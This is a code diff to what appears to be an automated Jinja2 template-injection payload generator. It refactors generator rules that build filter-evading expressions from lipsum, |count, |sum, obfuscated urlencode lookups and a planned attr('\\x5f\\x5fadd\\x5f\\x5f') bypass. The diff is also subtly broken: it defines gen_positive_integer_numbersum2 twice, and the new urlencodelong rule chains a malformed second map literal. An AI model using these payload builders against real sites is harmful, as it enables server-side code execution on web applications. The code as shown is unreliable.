@@ -418,12 +418,11 @@ class PayloadGenerator:
         result_precedence = tree_precedence(tree)
         assert result_precedence is not None, str_result + repr(tree)
         if result_precedence < target[1]:
-            logger.debug("enclose_under_generate: result_precedence < target[1]")
             logger.debug(
-                "enclose_under_generate: result_precedence=%d", result_precedence
+                "enclose_under_generate: result_precedence < target[1], result_precedence=%d, target[1]=%s", result_precedence, target[1]
             )
-            logger.debug("enclose_under_generate: %s", repr(tree))
-            return self.generate_by_list([(ENCLOSE, target[2])])
+            ret = self.generate_by_list([(ENCLOSE, target[2])])
+            return ret
         return str_result, used_context, tree
 
     def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
@@ -508,13 +507,13 @@ class PayloadGenerator:
         if self.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
-            logger.debug("Using gen rule: %s", gen.__name__)
             gen_ret: List[Target] = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
                 if hashable(gen_req):
                     self.cache[gen_req] = ret
                 continue
+            logger.debug("Using gen rule: %s", gen.__name__)
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
@@ -650,6 +649,7 @@ def gen_string_concat_tilde(context: dict, a, b) -> List[LiteralTarget]:
 
 # ---
 
+# TODO: add  f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
 
 @expression_gen
 def gen_plus_normal(context: dict, a, b):
@@ -936,21 +936,12 @@ def gen_positive_integer_recurmulnoastral(context: dict, value: int):
             continue
         if b == 0:
             alternative = [
-                (POSITIVE_INTEGER, a),
-                (LITERAL, ".__mul__("),
-                (POSITIVE_INTEGER, i),
-                (LITERAL, ")"),
+                (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i))
             ]
             alternatives.insert(0, alternative)
         else:
             alternative = [
-                (POSITIVE_INTEGER, a),
-                (LITERAL, ".__mul__("),
-                (POSITIVE_INTEGER, i),
-                (LITERAL, ")"),
-                (LITERAL, ".__add__("),
-                (POSITIVE_INTEGER, b),
-                (LITERAL, ")"),
+                (PLUS, (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i)), (POSITIVE_INTEGER, b))
             ]
             alternatives.append(alternative)
     if not alternatives:
@@ -971,7 +962,7 @@ def gen_positive_integer_length(context: dict, value: int):
         [
             (LITERAL, "("),
         ]
-        + [item for _ in range(value) for item in [(ZERO,), (LITERAL, ",")]]
+        + join_target((LITERAL, ","), [(ZERO, ) for _ in range(value)])
         + [
             (LITERAL, ")"),
         ]
@@ -981,8 +972,10 @@ def gen_positive_integer_length(context: dict, value: int):
             (LITERAL, "("),
         ]
         + [
-            (ONEOF, *[[(LITERAL, chr(c) + ",")] for c in range(ord("a"), ord("z") + 1)])
-            for _ in range(value)
+            (ONEOF, *[
+                join_target((LITERAL, ","), [(LITERAL, chr(c)) for _ in range(value)])
+                for c in range(ord("a"), ord("z") + 1)
+            ])
         ]
         + [
             (LITERAL, ")"),
@@ -1009,12 +1002,6 @@ def gen_positive_integer_length(context: dict, value: int):
 
 
 @expression_gen
-def gen_positive_integer_wordcount(context: dict, value: int):
-    target_list = [(LITERAL, "({})|wordcount".format(",".join("x" * value)))]
-    return [(EXPRESSION, precedence["filter"], target_list)]
-
-
-@expression_gen
 def gen_positive_integer_numbersum1(context: dict, value: int):
     if value < 5:
         return [(UNSATISFIED,)]
@@ -1030,13 +1017,28 @@ def gen_positive_integer_numbersum1(context: dict, value: int):
 def gen_positive_integer_numbersum2(context: dict, value: int):
     if value < 5:
         return [(UNSATISFIED,)]
-    alternative = []
+    alternatives = []
     for i in range(min(40, value - 1), 3, -1):
         inner = ",".join([str(i)] * (value // i) + [str(value % i)])
-        alternative.append([(LITERAL, "({})|sum".format(inner))])
-    target_list = [(ONEOF, *alternative)]
+        alternatives.append([(LITERAL, "({})|sum".format(inner))])
+    target_list = [(ONEOF, *alternatives)]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
+@expression_gen
+def gen_positive_integer_numbersum2(context: dict, value: int):
+    if value < 5:
+        return [(UNSATISFIED,)]
+    alternatives = []
+    for i in range(min(40, value - 1), 3, -1):
+        inner = ",".join([str(i)] * (value // i) + [str(value % i)])
+        alternatives.append([(LITERAL, "({})|sum".format(inner))])
+    target_list = [(ONEOF, *alternatives)]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+@expression_gen
+def gen_positive_integer_count(context: dict, value: int):
+    target_list = [(LITERAL, "({})|count".format(",".join("x" * value)))]
+    return [(EXPRESSION, precedence["filter"], target_list)]
 
 @expression_gen
 def gen_positive_integer_onesum1(context: dict, value: int):
@@ -1440,18 +1442,13 @@ def gen_string_percent_lipsumcomplex(context):
 @expression_gen
 def gen_string_percent_urlencodelong(context):
     target_list = [
-        (
-            LITERAL,
-            "((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)"
-            + "~(lipsum|string|list|batch(15)|first|last)"
-            + "~(lipsum|string|list|batch(20)|first|last)"
-            + "~(x|pprint|list|batch(4)|first|last)"
-            + "~(x|pprint|list|batch(2)|first|last)"
-            + "~(lipsum|string|list|batch(5)|first|last)"
-            + "~(lipsum|string|list|batch(8)|first|last)"
-            + "~(x|pprint|list|batch(3)|first|last)"
-            + "~(x|pprint|list|batch(4)|first|last)))|list|first|first)",
-        )
+        (LITERAL, "(lipsum,)|map("),
+        (ONEOF, 
+            [(LITERAL, "dict(ur=x,le=x,nco=x,de=x)|join")],
+            [(LITERAL, "'ur''lencode'")],
+            [(LITERAL, '"ur""lencode"')],
+        ),
+        (LITERAL, "(lipsum,)|map(dict(ur=x,le=x,nco=x,de=x)|join)|list|first|first")
     ]
     return [(EXPRESSION, precedence["enclose"], target_list)]
 
